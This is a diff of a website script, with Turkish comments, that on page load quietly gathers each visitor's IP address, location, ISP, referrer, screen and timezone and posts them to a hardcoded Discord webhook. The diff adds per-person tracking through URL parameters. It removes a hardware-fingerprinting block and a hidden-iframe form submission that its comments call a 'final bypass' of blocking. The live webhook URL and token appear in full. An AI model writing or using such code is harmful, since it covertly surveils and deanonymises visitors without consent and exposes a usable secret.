@@ -624,30 +624,24 @@ document.addEventListener("DOMContentLoaded", () => {
       const windowSize = `${window.innerWidth}x${window.innerHeight}`;
       const pixelRatio = window.devicePixelRatio ? `${window.devicePixelRatio}x` : "Standart";
 
-      // Derin Donanım (Fingerprint) Analizi
-      let gpuInfo = "Bilinmiyor";
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          if (debugInfo) {
-            gpuInfo = String(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)) || "Bulunamadı";
-          }
-        }
-      } catch (e) {}
-
-      const cpuCores = typeof navigator.hardwareConcurrency !== 'undefined' ? `${navigator.hardwareConcurrency} Çekirdek` : "Bilinmiyor";
-      const deviceRAM = typeof navigator.deviceMemory !== 'undefined' ? `Yaklaşık ${navigator.deviceMemory} GB` : "Gizli/Bilinmiyor";
-      const touchPoints = typeof navigator.maxTouchPoints !== 'undefined' ? `${navigator.maxTouchPoints} Nokta` : "Desteklenmiyor";
-
       const safeString = (val) => {
         const str = String(val);
         return (str && str !== "undefined" && str !== "null") ? str : "Bilinmiyor";
       };
 
+      // Özel URL Parametresi Tespiti (Örn: ?kisi=ahmet veya ?ref=instagram)
+      const urlParams = new URLSearchParams(window.location.search);
+      const trackingCode = urlParams.get('kisi') || urlParams.get('ref') || urlParams.get('source');
+
       const embedFields = [
-        { name: "🔗 Nereden Geldi?", value: safeString(referrer), inline: false },
+        { name: "🔗 Nereden Geldi?", value: safeString(referrer), inline: false }
+      ];
+
+      if (trackingCode) {
+        embedFields.push({ name: "🎯 Özel Takip Etiketi", value: safeString(trackingCode), inline: false });
+      }
+
+      embedFields.push(
         { name: "📍 Konum", value: safeString(locationData.location), inline: true },
         { name: "🌐 IP Adresi", value: safeString(locationData.ip), inline: true },
         { name: "🏢 Servis Sağlayıcı", value: safeString(locationData.isp), inline: true },
@@ -664,16 +658,12 @@ document.addEventListener("DOMContentLoaded", () => {
         { name: "🖥️ Ekran Çözünürlüğü", value: safeString(screenRes), inline: true },
         { name: "🌍 Dil & Saat Dilimi", value: safeString(`${navigator.language} / ${timeZone}`), inline: true },
         { name: "⏰ Yerel Saat", value: safeString(localTime), inline: true },
-        { name: "🎨 Tema Tercihi", value: safeString(prefersDark), inline: true },
-        { name: "🎮 Ekran Kartı (GPU)", value: safeString(gpuInfo), inline: true },
-        { name: "⚙️ İşlemci (CPU)", value: safeString(cpuCores), inline: true },
-        { name: "💾 Cihaz RAM'i", value: safeString(deviceRAM), inline: true },
-        { name: "🖐️ Dokunmatik Hassasiyet", value: safeString(touchPoints), inline: true }
-      ];
+        { name: "🎨 Tema Tercihi", value: safeString(prefersDark), inline: true }
+      );
 
       const payload = {
         embeds: [{
-          title: "👀 Yeni Ziyaretçi Analizi (Donanım Parmak İzi)",
+          title: "👀 Yeni Ziyaretçi Analizi (Özelleştirilmiş)",
           color: 3447003,
           fields: embedFields,
           footer: { text: "Bulut Gürgeli Analytics" },
@@ -681,39 +671,10 @@ document.addEventListener("DOMContentLoaded", () => {
         }]
       };
 
-      // Nihai Bypass: Fetch/XHR kullanmak yerine Tarayıcının yerleşik Form gönderimini kullan (Hidden Iframe)
-      try {
-        const webhookUrl = "https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
-        
-        const iframe = document.createElement("iframe");
-        iframe.name = "hidden_analytics_frame";
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-
-        const form = document.createElement("form");
-        form.action = webhookUrl;
-        form.method = "POST";
-        form.target = "hidden_analytics_frame";
-        form.enctype = "multipart/form-data";
-        form.style.display = "none";
-
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = "payload_json";
-        input.value = JSON.stringify(payload);
-        
-        form.appendChild(input);
-        document.body.appendChild(form);
-
-        form.submit();
-        
-        setTimeout(() => {
-          form.remove();
-          iframe.remove();
-        }, 5000);
-        
-      } catch (e) {
-        alert("⚠️ DİKKAT: En son kalkan delme taktiği bile engellendi: " + e.message);
-      }
+      fetch("https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(e => console.log("Analytics error"));
     });
 });
